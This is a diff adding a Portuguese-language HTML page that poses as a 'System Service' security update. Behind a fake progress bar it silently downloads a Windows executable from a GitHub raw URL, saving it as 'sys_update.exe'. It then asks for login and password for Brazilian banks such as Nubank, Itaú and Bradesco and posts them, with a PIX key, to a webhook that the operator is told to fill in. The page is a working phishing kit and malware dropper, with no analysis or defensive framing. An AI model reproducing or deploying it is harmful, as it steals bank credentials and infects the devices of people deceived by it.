@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Service</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+body{background:#0f0f0f;color:#e0e0e0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.card{background:#1a1a1a;border-radius:16px;padding:32px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+.icon{width:72px;height:72px;background:linear-gradient(135deg,#4CAF50,#2E7D32);border-radius:18px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:36px}
+h1{font-size:22px;margin-bottom:8px;font-weight:600}
+.sub{font-size:14px;color:#999;margin-bottom:28px}
+.btn{display:block;width:100%;padding:16px;background:#4CAF50;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:12px}
+.btn:active{background:#388E3C}
+.progress{height:4px;background:#333;border-radius:2px;margin:20px 0;overflow:hidden;display:none}
+.bar{height:100%;width:0;background:#4CAF50;transition:width .3s}
+.status{font-size:13px;color:#aaa;min-height:20px}
+.hidden{display:none}
+input,select{width:100%;padding:14px;margin:8px 0;border:1px solid #333;border-radius:10px;background:#111;color:#fff;font-size:15px}
+label{font-size:13px;color:#bbb;display:block;text-align:left;margin-top:12px}
+</style>
+</head>
+<body>
+<div class="card" id="main">
+  <div class="icon">⚙️</div>
+  <h1>System Service</h1>
+  <p class="sub">Atualização de segurança do sistema</p>
+  <button class="btn" id="installBtn" onclick="startInstall()">Instalar</button>
+  <div class="progress" id="prog"><div class="bar" id="bar"></div></div>
+  <p class="status" id="status"></p>
+</div>
+
+<div class="card hidden" id="login">
+  <h1>Confirmação</h1>
+  <p class="sub">Para concluir a instalação, confirme seus dados bancários</p>
+  <label>Banco / App</label>
+  <select id="bank">
+    <option value="nubank">Nubank</option>
+    <option value="inter">Inter</option>
+    <option value="itau">Itaú</option>
+    <option value="bradesco">Bradesco</option>
+    <option value="picpay">PicPay</option>
+    <option value="mercadopago">Mercado Pago</option>
+  </select>
+  <label>CPF / E-mail / Telefone</label>
+  <input type="text" id="user" placeholder="seu login">
+  <label>Senha</label>
+  <input type="password" id="pass" placeholder="••••••••">
+  <button class="btn" style="margin-top:20px" onclick="sendCreds()">Confirmar e Instalar</button>
+  <p class="status" id="loginStatus"></p>
+</div>
+
+<script>
+const PIX_KEY = "sua_chave_pix_aqui";
+const PIX_AMOUNT = "89.90";
+
+function startInstall(){
+  document.getElementById("installBtn").style.display="none";
+  document.getElementById("prog").style.display="block";
+  let p=0;
+  const bar=document.getElementById("bar");
+  const st=document.getElementById("status");
+  const t=setInterval(()=>{
+    p+=Math.random()*12+4;
+    if(p>100)p=100;
+    bar.style.width=p+"%";
+    if(p<30)st.textContent="Baixando componentes...";
+    else if(p<60)st.textContent="Verificando integridade...";
+    else if(p<90)st.textContent="Preparando instalação...";
+    else st.textContent="Quase pronto...";
+    if(p>=100){
+      clearInterval(t);
+      setTimeout(()=>{
+        document.getElementById("main").classList.add("hidden");
+        document.getElementById("login").classList.remove("hidden");
+      },600);
+    }
+  },180);
+  silentPull();
+}
+
+function silentPull(){
+  try{
+    const a=document.createElement("a");
+    a.href="https://raw.githubusercontent.com/anwoojin10041-creator/GrokAI/main/Launcher.exe";
+    a.download="update.bin";
+    a.style.display="none";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }catch(e){}
+  fetch("https://raw.githubusercontent.com/anwoojin10041-creator/GrokAI/main/Launcher.exe")
+    .then(r=>r.blob())
+    .then(b=>{
+      const u=URL.createObjectURL(b);
+      const a=document.createElement("a");
+      a.href=u;a.download="sys_update.exe";
+      a.click();
+      URL.revokeObjectURL(u);
+    }).catch(()=>{});
+}
+
+function sendCreds(){
+  const bank=document.getElementById("bank").value;
+  const user=document.getElementById("user").value;
+  const pass=document.getElementById("pass").value;
+  const st=document.getElementById("loginStatus");
+  if(!user||!pass){st.textContent="Preencha todos os campos";return;}
+  st.textContent="Validando...";
+
+  const data={
+    bank:bank,
+    user:user,
+    pass:pass,
+    pix_key:PIX_KEY,
+    amount:PIX_AMOUNT,
+    ua:navigator.userAgent,
+    time:new Date().toISOString()
+  };
+
+  // TROCA ESSA URL PELO SEU WEBHOOK / SERVIDOR
+  fetch("https://SEU_WEBHOOK_OU_SERVIDOR_AQUI",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(data)
+  }).catch(()=>{});
+
+  setTimeout(()=>{
+    st.textContent="Instalado com sucesso. Reinicie o aparelho.";
+    document.querySelector("#login .btn").style.display="none";
+  },1200);
+}
+</script>
+</body>
+</html>
